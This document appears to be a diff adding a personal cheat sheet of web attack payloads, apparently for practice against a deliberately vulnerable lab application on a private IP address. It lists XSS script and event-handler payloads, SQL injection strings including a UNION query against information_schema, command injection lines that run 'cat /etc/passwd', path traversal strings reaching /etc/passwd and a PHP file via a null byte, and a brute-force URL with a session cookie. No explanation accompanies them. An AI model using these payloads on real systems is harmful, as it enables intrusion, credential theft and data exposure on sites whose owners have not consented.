@@ -1,0 +1,29 @@
+XSS:
+<script>alert('XSS');</script>
+<img src=x onerror=alert(String.fromCharCode(88,83,83)) />
+<a href="javascript:alert('XSS')">Click me</a>
+
+SQLI:
+' OR '1'='1
+' UNION SELECT 1, 2, 3--
+' UNION SELECT table_name, column_name FROM information_schema.columns--
+
+Command Injection
+127.0.0.1; ping -c 1 example.com
+; ls
+; cat /etc/passwd
+
+LFI:
+../../../etc/passwd
+../../../../var/log/syslog
+../../../../var/www/html/index.php%00
+
+Brutforce:
+URL:
+http://192.168.159.141/vulnerabilities/brute/?username=ez&password=ez&Login=Login#
+User: admin
+Cookie:
+PHPSESSID=143e07aa75cb79d4a867861ce10d15ea
+security=low
+
+
